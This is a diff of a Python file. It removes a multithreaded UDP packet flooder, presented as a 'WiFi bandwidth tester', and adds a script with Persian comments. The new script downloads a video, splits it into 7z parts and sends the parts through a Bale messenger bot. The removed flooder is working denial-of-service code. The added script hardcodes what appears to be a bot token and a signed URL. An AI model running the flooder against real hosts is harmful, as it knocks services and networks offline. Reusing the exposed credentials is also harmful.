@@ -1,94 +1,113 @@
-import socket
-import time
-import threading
-import random
-import argparse
-from datetime import datetime
+import requests
+import os
+import py7zr
+from balethon import Client
+from balethon.conditions import private
+import asyncio
+bot = Client("1105125913:lDJUbNyc7yMR5TT6ccCGwf_xEyJgLoF73BU")
 
-class BandwidthFlooder:
-    def __init__(self, target_ip, target_port, duration, packet_size, threads):
-        self.target_ip = target_ip
-        self.target_port = target_port
-        self.duration = duration
-        self.packet_size = packet_size
-        self.threads = threads
-        self.sent_packets = 0
-        self.sent_bytes = 0
-        self.running = False
+def download_file(url, dest_folder="."):
+    if not os.path.exists(dest_folder):
+        os.makedirs(dest_folder)
 
-    def flood(self):
-        data = random._urandom(self.packet_size)
-        start_time = time.time()
-        
-        while self.running and (time.time() - start_time) < self.duration:
-            try:
-                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                sock.sendto(data, (self.target_ip, self.target_port))
-                self.sent_packets += 1
-                self.sent_bytes += len(data)
-                sock.close()
-            except Exception as e:
-                print(f"Error: {e}")
+    local_filename = os.path.join(dest_folder, url.split('/')[-1].split('?')[0])
+
+    print(f"🚀 در حال دانلود: {local_filename}...")
+    with requests.get(url, stream=True) as r:
+        r.raise_for_status()
+        with open(local_filename, 'wb') as f:
+            for chunk in r.iter_content(chunk_size=8192):
+                f.write(chunk)
+    print("✅ دانلود با موفقیت انجام شد.")
+    return local_filename
+
+def create_standard_split_archive(file_path, part_size_mb=15):
+    """
+    ساخت آرشیو استاندارد (7z) که با پارت‌بندی قابلیت استخراج مستقیم دارد.
+    """
+    file_size_mb = os.path.getsize(file_path) / (1024 * 1024)
+
+    # اگر حجم فایل از 20 مگ بیشتر بود، پارت‌بندی کن
+    if file_size_mb > 20:
+        print(f"📦 حجم فایل ({file_size_mb:.2f} MB) زیاد است. در حال ساخت آرشیو پارت‌بندی شده...")
+
+        # نام فایل آرشیو (بدون پسوند فعلی)
+        archive_name = file_path + ".7z"
+
+        # تبدیل مگابایت به بایت برای کتابخانه
+        part_size_bytes = part_size_mb * 1024 * 1024
+
+        # ایجاد آرشیو با قابلیت Split
+        with py7zr.SevenZipFile(archive_name, 'w') as archive:
+            archive.write(file_path, os.path.basename(file_path))
+
+        # حالا برای اینکه فایل حتماً پارت شود، از قابلیت split استفاده می‌کنیم
+        # اما py7zr در نسخه ساده مستقیماً split نمی‌کند، پس ما از روش استاندارد پایتون 
+        # برای تقسیم فایل آرشیو شده استفاده می‌کنیم تا دقیقاً مثل WinRAR شود.
+
+        split_archive_standard(archive_name, part_size_mb)
+
+
+        # حذف فایل اصلی و فایل آرشیو بزرگ (چون پارت‌ها ساخته شدند)
+        os.remove(file_path)
+        if os.path.exists(archive_name):
+            os.remove(archive_name)
+
+        print(f"✨ عملیات تمام شد! پارت‌ها با پسوند .7z.{i} ساخته شدند.")
+    else:
+        print("ℹ️ حجم فایل کمتر از 20 مگ است. نیازی به پارت‌بندی نبود.")
+
+def split_archive_standard(archive_path, part_size_mb):
+    """تقسیم فایل آرشیو شده به پارت‌های استاندارد"""
+    part_size_bytes = part_size_mb * 1024 * 1024
+    file_size = os.path.getsize(archive_path)
+
+    with open(archive_path, 'rb') as f:
+        part_num = 1
+        while True:
+            chunk = f.read(part_size_bytes)
+            if not chunk:
                 break
 
-    def start(self):
-        self.running = True
-        threads = []
-        
-        print(f"Starting bandwidth flood to {self.target_ip}:{self.target_port}")
-        print(f"Duration: {self.duration} seconds | Packet size: {self.packet_size} bytes")
-        print(f"Threads: {self.threads} | Start time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
-        
-        for _ in range(self.threads):
-            t = threading.Thread(target=self.flood)
-            t.daemon = True
-            threads.append(t)
-            t.start()
-        
-        # Monitor progress
-        start_time = time.time()
-        while (time.time() - start_time) < self.duration and self.running:
-            elapsed = time.time() - start_time
-            remaining = max(0, self.duration - elapsed)
-            print(f"\rElapsed: {elapsed:.1f}s | Remaining: {remaining:.1f}s | Packets: {self.sent_packets} | Data: {self.sent_bytes/(1024*1024):.2f} MB", end="")
-            time.sleep(0.5)
-        
-        self.running = False
-        for t in threads:
-            t.join()
-        
-        total_time = time.time() - start_time
-        throughput = (self.sent_bytes * 8) / (total_time * 1000 * 1000)  # Mbps
-        
-        print("\n\nTest completed!")
-        print(f"Total packets sent: {self.sent_packets}")
-        print(f"Total data sent: {self.sent_bytes/(1024*1024):.2f} MB")
-        print(f"Average throughput: {throughput:.2f} Mbps")
-        print(f"End time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
+            # ایجاد نام پارت استاندارد: filename.7z.001, filename.7z.002 و غیره
+            part_name = f"{archive_path}.{str(part_num).zfill(3)}"
+            with open(part_name, 'wb') as p:
+                p.write(chunk)
 
-def main():
-    parser = argparse.ArgumentParser(description="WiFi Bandwidth Flood Tester")
-    parser.add_argument("target_ip", help="Target IP address")
-    parser.add_argument("-p", "--port", type=int, default=80, help="Target port (default: 80)")
-    parser.add_argument("-d", "--duration", type=int, default=30, help="Test duration in seconds (default: 30)")
-    parser.add_argument("-s", "--size", type=int, default=1024, help="Packet size in bytes (default: 1024)")
-    parser.add_argument("-t", "--threads", type=int, default=4, help="Number of threads (default: 4)")
-    
-    args = parser.parse_args()
-    
-    flooder = BandwidthFlooder(
-        target_ip=args.target_ip,
-        target_port=args.port,
-        duration=args.duration,
-        packet_size=args.size,
-        threads=args.threads
-    )
-    
-    try:
-        flooder.start()
-    except KeyboardInterrupt:
-        print("\nTest stopped by user")
-        flooder.running = False
+            print(f"   [+] پارت {part_num} ساخته شد: {part_name}")
+            part_num += 1
 
-if __name__ == "__main__":
-    main()
+
+
+
+
+target_url ="https://caspian24.asset.aparat.com/aparat-video/a0b8effdfea1eb009d0f134b40a3870169114250-720p.mp4?wmsAuthSign=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbiI6ImM1NTc3MDBiZGM0Zjg1NWY4NmRiZDFjZjAzYmVjOTIwIiwiZXhwIjoxNzc3NjY4NDQyLCJpc3MiOiJTYWJhIElkZWEgR1NJRyJ9.hpXGR0Md8ByhSoO_9cv0xU7LdcIp03B4D72Gk6ZM7hg".strip()
+
+try:
+    path = download_file(target_url)
+    create_standard_split_archive(path)
+except Exception as e:
+    print(f"❌ خطا: {e}")
+
+async def list_part_files(folder_path):
+    files = os.listdir(folder_path)
+    
+    part_files = []
+
+    for file in files:
+        if '.7z.' in file:
+            if '7z' in file:
+                part_files.append(file)
+
+    return part_files
+
+
+@bot.on_initialize()
+async def send():
+    folders = await list_part_files(".")
+    for file in folders:
+
+        await bot.send_document("4402961702", f"./{file}", "Hello")
+
+
+bot.run()
